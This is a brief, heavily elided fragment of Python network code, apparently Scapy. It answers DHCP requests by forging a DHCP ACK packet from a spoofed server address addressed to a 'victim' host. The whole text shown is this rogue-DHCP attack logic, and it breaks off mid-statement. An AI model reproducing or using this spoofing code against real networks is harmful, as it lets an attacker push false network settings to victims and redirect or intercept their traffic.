		...
		if p.haslayer(DHCP):
			...
			if mtype[0][1] == 3:
				...
				try:
					...
					self.dhcp_ack = Ether()/IP(id=0, tos=16, ttl=16, src=self.dhcp_server_ip,dst=self.victim_ip[1],chksum=0)/\
						UDP(sport=67,dport=68,chksum=0)/\
						BOOTP(op=2, yiaddr=self.victim_ip[1], ciaddr='0.0.0.0', siaddr= self.dhcp_server_ip, giaddr= '0.0.0.0', chaddr= '$\nd]\xe8h\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00', sname='', file='', xid=p[BOOTP].xid)/\
